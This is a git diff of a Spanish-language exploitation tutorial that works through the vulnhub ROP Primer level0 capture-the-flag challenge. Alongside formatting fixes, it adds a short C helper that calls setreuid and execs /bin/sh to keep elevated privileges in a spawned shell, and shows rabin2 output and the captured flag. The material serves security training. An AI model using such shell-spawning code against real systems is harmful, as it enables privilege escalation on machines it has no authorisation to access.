@@ -521,7 +521,7 @@ Comprobamos que funciona si terminamos de ejecutarlo:
 Segmentation fault
 ```
 
-###EJERCICIOS
+### EJERCICIOS
 
 **EJEMPLO 1**
 
@@ -638,8 +638,8 @@ print payload
 
 **EJEMPLO 2**
 
-De la máquina de vulnhub ropPrimer-0.2, el caso level0.
-https://www.vulnhub.com/entry/rop-primer-02,114/
+De la máquina de vulnhub ropPrimer-0.2, el caso level0.		
+Ref: https://www.vulnhub.com/entry/rop-primer-02,114/
 
 Este ejercicio lo intenté resolver aplicando la primera técnica explicada aquí, pero no se por que razón en la MV me daba "Segmentation fault" mientras que en el gdb funcionaba ya que lanzaba un proceso con una shell nueva. 
 Veamos previamente lo que yo intenté y luego la solución mucho más sencilla y elegante que encontré después.
@@ -757,6 +757,18 @@ rabin2 -z ./level0 | grep processor
 Warning: Cannot initialize dynamic strings
 vaddr=0x080b0ee6 paddr=0x00068ee6 ordinal=356 sz=10 len=9 section=.rodata type=ascii string=processor
 ```
+Valor de proccesor.c:
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+int main(void)
+{
+ int euid = geteuid();
+ setreuid(euid, euid);
+ execv("/bin/sh", NULL);
+}
+```
 Aquí hay que constar que antes lo intenté con otra cadena:
 ```
 vaddr=0x080ace48 paddr=0x00064e48 ordinal=133 sz=5 len=4 section=.rodata type=ascii string=apic
@@ -831,6 +843,9 @@ cat flag
 flag{rop_the_night_away}
 ```
 
+**EJEMPLO 3**
+
+Level1 de la misma máquina que el Ejemplo2.
 
 
 
